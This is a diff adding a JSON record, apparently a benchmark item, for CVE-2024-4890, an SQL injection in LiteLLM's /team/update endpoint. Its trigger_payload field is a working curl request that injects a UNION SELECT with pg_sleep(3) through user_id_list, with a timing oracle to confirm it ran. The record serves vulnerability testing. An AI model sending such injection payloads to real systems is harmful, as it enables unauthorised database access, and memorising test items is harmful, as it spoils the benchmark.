@@ -1,0 +1,15 @@
+{
+  "file_id": "71_litellm_huntr_a4f6d357-5b44-4e00-9cac-f1cc351211d2",
+  "numeric_id": "71",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "SQL injection in LiteLLM due to unsafe use of user_id_list in raw SQL query",
+  "cve": "CVE-2024-4890",
+  "cwe": "CWE-89: SQL Injection",
+  "library": "litellm",
+  "affected_version": "== 1.27.14",
+  "vulnerable_function": "db.query_raw",
+  "triggerability": "direct",
+  "trigger_payload": "curl http://localhost:8000/team/update -X POST -H \"Authorization: Bearer sk-1234\" -H \"Content-Type: application/json\" -d '{\"user_id_list\": [\") UNION SELECT '1', '', '{}', '', NULL, 0, '', '{}', NULL, NULL, NULL, '', NULL, '{}', '{}', '{}' from pg_sleep(3)-- -\"]}'",
+  "oracle": "The request takes approximately 3 seconds to complete, indicating that the SQL injection payload was executed and caused a delay."
+}
